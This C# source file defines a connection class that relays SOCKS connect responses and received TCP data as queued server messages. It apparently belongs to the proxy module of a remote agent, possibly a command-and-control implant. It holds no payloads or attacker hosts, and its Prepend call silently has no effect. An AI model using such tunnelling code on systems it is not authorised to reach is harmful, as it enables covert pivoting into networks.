using Agent.Models;
using System.Collections.Concurrent;

namespace Agent
{
    public class ConnectionConfig
    {
        public int server_id { get; set; }
        public AsyncTcpClient client;
        public AutoResetEvent onSocksEvent = new AutoResetEvent(false);
        private ConcurrentBag<ServerDatagram> messages = new ConcurrentBag<ServerDatagram>();
        public bool exited;

        public ConnectionConfig(ConnectionOptions co)
        {
            client = new AsyncTcpClient(co)
            {
                ConnectedCallback = async (client, isReconnected) =>
                {
                    ServerDatagram smOut = new ServerDatagram(
                     server_id,
                     new ConnectResponse
                     {
                         bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
                         bndport = new byte[] { 0x00, 0x00 },
                         addrtype = (byte)AddressType.IPv4,
                         status = ConnectResponseStatus.Success,
                     }.ToByte(),
                     IsConnected() ? false : true
                    );
                    messages.Add(smOut);
                    onSocksEvent.Set();
                },
                ClosedCallback = async (client, closedByRemote) =>
                {
                    onSocksEvent.Set();
                    messages.Add(new ServerDatagram(server_id, new byte[] { }, true));
                    exited = true;
                },
                ReceivedCallback = async (client, count) =>
                {
                    byte[] buf;
                    if (count > 0)
                    {
                        buf = this.client.ByteBuffer.Dequeue(count);
                        messages.Add(new ServerDatagram(server_id, buf, IsConnected() ? false : true));
                    }
                }
            };
            server_id = co.server_id;
            exited = false;
        }

        public bool IsConnected()
        {
            try
            {
                return client.IsConnected;
            }
            catch
            {
                return false;
            }
        }

        public List<ServerDatagram> GetMessages()
        {
            List<ServerDatagram> msgs = new List<ServerDatagram>(messages);
            messages.Clear();

            if (exited)
            {
                msgs.Prepend(new ServerDatagram(server_id, new byte[] { }, true));
            }

            foreach (var msg in msgs)
            {
                msg.PrepareMessage();
            }
            return msgs;
        }
    }
}
